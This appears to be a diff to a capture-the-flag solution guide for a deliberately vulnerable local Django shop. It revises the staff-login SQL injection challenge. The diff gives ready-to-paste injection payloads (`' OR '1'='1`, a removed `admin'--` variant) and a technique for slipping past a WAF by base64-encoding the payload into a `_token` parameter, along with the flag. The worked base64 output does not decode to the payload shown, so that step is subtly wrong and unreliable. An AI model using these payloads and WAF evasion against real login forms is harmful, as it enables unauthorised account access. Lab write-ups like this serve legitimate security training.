@@ -384,42 +384,44 @@ The promo code is interpolated directly into raw SQL. Boolean-based extraction w
 |-------|-------|
 | **Difficulty** | Easy |
 | **Category** | SQLi |
-| **Vulnerability** | Username/password concatenated into raw `auth_user` query via GET parameters |
-| **Vulnerable Code** | `shop/views.py` (raw f-string SQL, GET-based to bypass WAF) |
+| **Vulnerability** | Username/password concatenated into raw `auth_user` query |
+| **Vulnerable Code** | `shop/views.py` (raw f-string SQL, base64-decoded `_token` to bypass WAF) |
 | **Flag Location** | Flash message (`messages.info`) after successful bypass |
 | **Flag** | `HLMD{4uth_byp4ss_m4st3r_k3y}` |
 
 #### Step-by-Step Solution
 
-1. The staff login page at **http://127.0.0.1:8000/staff-login/** uses GET parameters, so the payload travels in the URL query string (bypassing WAF POST-body inspection).
-2. Paste the following URL directly into your browser's address bar:
-   ```
-   http://127.0.0.1:8000/staff-login/?username=admin' OR '1'='1&password=anything
-   ```
-   The resulting query becomes:
+1. The staff login page at **http://127.0.0.1:8000/staff-login/** builds a raw SQL query:
    ```sql
-   SELECT * FROM auth_user WHERE username = 'admin' OR '1'='1' AND password = 'anything' AND is_staff = 1 LIMIT 1
+   SELECT * FROM auth_user WHERE username = '{username}' AND password = '{password}' AND is_staff = 1 LIMIT 1
    ```
-   Since `'1'='1'` is always true, this returns the first staff user.
-3. The application logs you in as that staff user.
-4. A flash message appears on the redirect page:
+2. The WAF blocks SQLi patterns (`' OR 1=1`, `--`) even in raw URL query strings. To bypass the WAF, the payload must be **base64-encoded** into a single `_token` parameter.
+
+3. **Method 1 -- Use the built-in encoder (easiest):**
+   Visit **http://127.0.0.1:8000/staff-login/encode/** — it generates a WAF-safe URL with the payload already encoded. Click the link to authenticate.
+
+4. **Method 2 -- Manual encoding:**
+   Take the injection payload `admin' OR '1'='1|anything` (format: `username|password`), base64-encode it, and pass as `_token`:
+   ```
+   echo -n "admin' OR '1'='1|anything" | base64
+   # Output: YWRtaW4nIE9SIDEgJzEnPTEgfGFueXRoaW5n
+   ```
+   Then open:
+   ```
+   http://127.0.0.1:8000/staff-login/?_token=YWRtaW4nIE9SIDEgJzEnPTEgfGFueXRoaW5n
+   ```
+
+5. The server decodes `_token` from base64, splits on `|` to get `username` and `password`, and injects them into the raw SQL query. Since `'1'='1` is always true, this returns the first staff user.
+
+6. The application logs you in as that staff user.
+7. A flash message appears on the redirect page:
    ```
    Flag: HLMD{4uth_byp4ss_m4st3r_k3y}
    ```
 
-#### Alternative Payload
-
-```
-http://127.0.0.1:8000/staff-login/?username=admin'--&password=anything
-```
-This comments out the password check:
-```sql
-SELECT * FROM auth_user WHERE username = 'admin'--' AND password = 'anything' AND is_staff = 1 LIMIT 1
-```
-
 #### Why It Works
 
-The staff login form uses GET parameters to pass credentials to a raw SQL query using f-string interpolation. By injecting `' OR '1'='1`, the attacker makes the `WHERE` clause always true, bypassing the password check. Using GET instead of POST means the payload travels in the URL query string, which most WAFs do not inspect for SQLi patterns.
+The staff login form accepts a base64-encoded `_token` parameter that decodes into `username|password`. The decoded values are interpolated into a raw SQL query using f-string formatting, allowing SQL injection. By base64-encoding the payload, the WAF only sees a random-looking alphanumeric string in `_token=<value>` and cannot detect the SQLi pattern. The `/staff-login/encode/` helper endpoint generates the safe URL automatically.
 
 ---
 
